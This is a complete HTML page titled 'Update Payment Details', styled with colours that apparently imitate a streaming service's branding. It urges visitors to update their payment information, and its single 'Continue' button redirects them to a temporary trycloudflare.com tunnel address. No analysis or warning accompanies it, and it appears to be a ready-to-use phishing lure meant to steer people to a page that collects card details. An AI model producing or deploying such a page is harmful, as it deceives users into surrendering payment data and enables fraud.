<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Update Payment Details</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="logo.png">
  <style>
    body {
      background: #141414;
      margin: 0;
      font-family: 'Helvetica Neue', Arial, sans-serif;
      color: #fff;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: rgba(0,0,0,0.85);
      padding: 32px 24px 24px 24px;
      border-radius: 8px;
      box-shadow: 0 0 30px #0007;
      max-width: 340px;
      width: 95vw;
      margin: 24px 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .logo {
      width: 85px;
      margin-bottom: 18px;
    }
    h1 {
      font-size: 1.3rem;
      font-weight: 700;
      margin-bottom: 30px;
      text-align: center;
      letter-spacing: 0.01em;
    }
    .continue-btn {
      width: 100%;
      background: #e50914;
      color: #fff;
      border: none;
      padding: 14px 0;
      border-radius: 4px;
      font-size: 1.13rem;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
      margin-bottom: 10px;
      transition: background 0.18s;
      letter-spacing: 0.01em;
      box-shadow: 0 2px 8px 0 rgba(229,9,20,0.08);
    }
    .continue-btn:hover, .continue-btn:focus {
      background: #b0060f;
    }
    @media (max-width: 650px) {
      .container {
        padding: 18px 0 12px 0;
        max-width: 98vw;
      }
      .logo { width: 60px;}
      h1 { font-size: 1.02rem;}
    }
    @media (max-width: 400px) {
      .container { padding: 8px 0 6px 0;}
      h1 { font-size: 0.98rem;}
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="logo.png" alt="Logo" class="logo">
    <h1>Update Your Payment Information</h1>
    <button type="button" class="continue-btn" onclick="window.location.href='https://ladies-visual-telephone-absent.trycloudflare.com/safe.html'">Continue</button>
  </div>
</body>
</html>
